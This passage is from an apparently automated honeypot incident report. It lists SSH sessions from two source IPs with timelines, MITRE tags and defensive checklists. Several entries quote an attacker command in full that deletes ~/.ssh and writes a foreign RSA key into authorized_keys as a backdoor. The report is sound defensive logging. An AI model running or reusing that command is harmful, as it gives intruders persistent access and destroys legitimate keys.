
| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:52 |
| **Last Seen** | 2026-06-05 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:52:37` | `cowrie.session.connect` |
| `2026-06-05 08:52:37` | `cowrie.client.version` |
| `2026-06-05 08:52:37` | `cowrie.client.kex` |
| `2026-06-05 08:52:38` | `cowrie.login.success` |
| `2026-06-05 08:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d32df2f9c4

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:54 |
| **Last Seen** | 2026-06-05 08:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:54:11` | `cowrie.session.connect` |
| `2026-06-05 08:54:11` | `cowrie.client.version` |
| `2026-06-05 08:54:11` | `cowrie.client.kex` |
| `2026-06-05 08:54:11` | `cowrie.login.success` |
| `2026-06-05 08:54:12` | `cowrie.session.params` |
| `2026-06-05 08:54:12` | `cowrie.command.input` |
| `2026-06-05 08:54:12` | `cowrie.command.failed` |
| `2026-06-05 08:54:12` | `cowrie.log.closed` |
| `2026-06-05 08:54:12` | `cowrie.session.params` |
| `2026-06-05 08:54:12` | `cowrie.command.input` |
| `2026-06-05 08:54:12` | `cowrie.session.file_download` |
| `2026-06-05 08:54:12` | `cowrie.log.closed` |
| `2026-06-05 08:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8a25e8ba9a

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:54 |
| **Last Seen** | 2026-06-05 08:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:54:15` | `cowrie.session.connect` |
| `2026-06-05 08:54:15` | `cowrie.client.version` |
| `2026-06-05 08:54:15` | `cowrie.client.kex` |
| `2026-06-05 08:54:16` | `cowrie.login.success` |
| `2026-06-05 08:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e3e0b8d7c9

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:56 |
| **Last Seen** | 2026-06-05 08:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:56:22` | `cowrie.session.connect` |
| `2026-06-05 08:56:22` | `cowrie.client.version` |
| `2026-06-05 08:56:22` | `cowrie.client.kex` |
| `2026-06-05 08:56:23` | `cowrie.login.success` |
| `2026-06-05 08:56:24` | `cowrie.session.params` |
| `2026-06-05 08:56:24` | `cowrie.command.input` |
| `2026-06-05 08:56:24` | `cowrie.command.failed` |
| `2026-06-05 08:56:24` | `cowrie.log.closed` |
| `2026-06-05 08:56:24` | `cowrie.session.params` |
| `2026-06-05 08:56:24` | `cowrie.command.input` |
| `2026-06-05 08:56:25` | `cowrie.session.file_download` |
| `2026-06-05 08:56:25` | `cowrie.log.closed` |
| `2026-06-05 08:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc87c11d0fd

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:56 |
| **Last Seen** | 2026-06-05 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:56:28` | `cowrie.session.connect` |
| `2026-06-05 08:56:28` | `cowrie.client.version` |
| `2026-06-05 08:56:28` | `cowrie.client.kex` |
| `2026-06-05 08:56:29` | `cowrie.login.success` |
| `2026-06-05 08:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d454c0103878

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:58 |
| **Last Seen** | 2026-06-05 08:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:58:46` | `cowrie.session.connect` |
| `2026-06-05 08:58:46` | `cowrie.client.version` |
| `2026-06-05 08:58:47` | `cowrie.client.kex` |
| `2026-06-05 08:58:47` | `cowrie.login.success` |
| `2026-06-05 08:58:48` | `cowrie.session.params` |
| `2026-06-05 08:58:48` | `cowrie.command.input` |
| `2026-06-05 08:58:48` | `cowrie.command.failed` |
| `2026-06-05 08:58:48` | `cowrie.log.closed` |
| `2026-06-05 08:58:48` | `cowrie.session.params` |
| `2026-06-05 08:58:48` | `cowrie.command.input` |
| `2026-06-05 08:58:48` | `cowrie.session.file_download` |
| `2026-06-05 08:58:48` | `cowrie.log.closed` |
| `2026-06-05 08:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3588dea17942

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:58 |
| **Last Seen** | 2026-06-05 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:58:51` | `cowrie.session.connect` |
| `2026-06-05 08:58:51` | `cowrie.client.version` |
| `2026-06-05 08:58:51` | `cowrie.client.kex` |
| `2026-06-05 08:58:51` | `cowrie.login.success` |
| `2026-06-05 08:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2eb7ff74b49

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:00 |
| **Last Seen** | 2026-06-05 09:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:00:12` | `cowrie.session.connect` |
| `2026-06-05 09:00:12` | `cowrie.client.version` |
| `2026-06-05 09:00:12` | `cowrie.client.kex` |
| `2026-06-05 09:00:13` | `cowrie.login.success` |
| `2026-06-05 09:00:13` | `cowrie.session.params` |
| `2026-06-05 09:00:13` | `cowrie.command.input` |
| `2026-06-05 09:00:13` | `cowrie.command.failed` |
| `2026-06-05 09:00:14` | `cowrie.log.closed` |
| `2026-06-05 09:00:14` | `cowrie.session.params` |
| `2026-06-05 09:00:14` | `cowrie.command.input` |
| `2026-06-05 09:00:14` | `cowrie.session.file_download` |
| `2026-06-05 09:00:14` | `cowrie.log.closed` |
| `2026-06-05 09:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a926c1a3b9

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:00 |
| **Last Seen** | 2026-06-05 09:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:00:17` | `cowrie.session.connect` |
| `2026-06-05 09:00:17` | `cowrie.client.version` |
| `2026-06-05 09:00:17` | `cowrie.client.kex` |
| `2026-06-05 09:00:18` | `cowrie.login.success` |
| `2026-06-05 09:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1682f9ecce08

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:02 |
| **Last Seen** | 2026-06-05 09:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:02:01` | `cowrie.session.connect` |
| `2026-06-05 09:02:01` | `cowrie.client.version` |
| `2026-06-05 09:02:01` | `cowrie.client.kex` |
| `2026-06-05 09:02:02` | `cowrie.login.success` |
| `2026-06-05 09:02:02` | `cowrie.session.params` |
| `2026-06-05 09:02:02` | `cowrie.command.input` |
| `2026-06-05 09:02:02` | `cowrie.command.failed` |
| `2026-06-05 09:02:03` | `cowrie.log.closed` |
| `2026-06-05 09:02:03` | `cowrie.session.params` |
| `2026-06-05 09:02:03` | `cowrie.command.input` |
| `2026-06-05 09:02:03` | `cowrie.session.file_download` |
| `2026-06-05 09:02:03` | `cowrie.log.closed` |
| `2026-06-05 09:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87582238181e

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:02 |
| **Last Seen** | 2026-06-05 09:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:02:06` | `cowrie.session.connect` |
| `2026-06-05 09:02:06` | `cowrie.client.version` |
| `2026-06-05 09:02:06` | `cowrie.client.kex` |
| `2026-06-05 09:02:07` | `cowrie.login.success` |
| `2026-06-05 09:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16aff410bfbf

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:03 |
| **Last Seen** | 2026-06-05 09:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:03:17` | `cowrie.session.connect` |
| `2026-06-05 09:03:17` | `cowrie.client.version` |
| `2026-06-05 09:03:17` | `cowrie.client.kex` |
| `2026-06-05 09:03:17` | `cowrie.login.success` |
| `2026-06-05 09:03:18` | `cowrie.session.params` |
| `2026-06-05 09:03:18` | `cowrie.command.input` |
| `2026-06-05 09:03:18` | `cowrie.command.failed` |
| `2026-06-05 09:03:18` | `cowrie.log.closed` |
| `2026-06-05 09:03:18` | `cowrie.session.params` |
| `2026-06-05 09:03:18` | `cowrie.command.input` |
| `2026-06-05 09:03:18` | `cowrie.session.file_download` |
| `2026-06-05 09:03:18` | `cowrie.log.closed` |
| `2026-06-05 09:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd6a4ec4cc9

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:03 |
| **Last Seen** | 2026-06-05 09:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:03:21` | `cowrie.session.connect` |
| `2026-06-05 09:03:21` | `cowrie.client.version` |
| `2026-06-05 09:03:21` | `cowrie.client.kex` |
| `2026-06-05 09:03:21` | `cowrie.login.success` |
| `2026-06-05 09:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73227525757c

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:05 |
| **Last Seen** | 2026-06-05 09:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:05:41` | `cowrie.session.connect` |
| `2026-06-05 09:05:41` | `cowrie.client.version` |
| `2026-06-05 09:05:41` | `cowrie.client.kex` |
| `2026-06-05 09:05:41` | `cowrie.login.success` |
| `2026-06-05 09:05:42` | `cowrie.session.params` |
| `2026-06-05 09:05:42` | `cowrie.command.input` |
| `2026-06-05 09:05:42` | `cowrie.command.failed` |
| `2026-06-05 09:05:42` | `cowrie.log.closed` |
| `2026-06-05 09:05:42` | `cowrie.session.params` |
| `2026-06-05 09:05:42` | `cowrie.command.input` |
| `2026-06-05 09:05:42` | `cowrie.session.file_download` |
| `2026-06-05 09:05:42` | `cowrie.log.closed` |
| `2026-06-05 09:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac9a0916f82

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:05 |
| **Last Seen** | 2026-06-05 09:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:05:45` | `cowrie.session.connect` |
| `2026-06-05 09:05:45` | `cowrie.client.version` |
| `2026-06-05 09:05:45` | `cowrie.client.kex` |
| `2026-06-05 09:05:45` | `cowrie.login.success` |
| `2026-06-05 09:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6c5b91674e

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:07 |
| **Last Seen** | 2026-06-05 09:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:07:30` | `cowrie.session.connect` |
| `2026-06-05 09:07:30` | `cowrie.client.version` |
| `2026-06-05 09:07:30` | `cowrie.client.kex` |
| `2026-06-05 09:07:31` | `cowrie.login.success` |
| `2026-06-05 09:07:31` | `cowrie.session.params` |
| `2026-06-05 09:07:31` | `cowrie.command.input` |
| `2026-06-05 09:07:31` | `cowrie.command.failed` |
| `2026-06-05 09:07:32` | `cowrie.log.closed` |
| `2026-06-05 09:07:32` | `cowrie.session.params` |
| `2026-06-05 09:07:32` | `cowrie.command.input` |
| `2026-06-05 09:07:32` | `cowrie.session.file_download` |
| `2026-06-05 09:07:32` | `cowrie.log.closed` |
| `2026-06-05 09:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f24e5e9375

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:07 |
| **Last Seen** | 2026-06-05 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:07:35` | `cowrie.session.connect` |
| `2026-06-05 09:07:35` | `cowrie.client.version` |
| `2026-06-05 09:07:35` | `cowrie.client.kex` |
| `2026-06-05 09:07:36` | `cowrie.login.success` |
| `2026-06-05 09:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c667b4daed3

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:11 |
| **Last Seen** | 2026-06-05 09:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
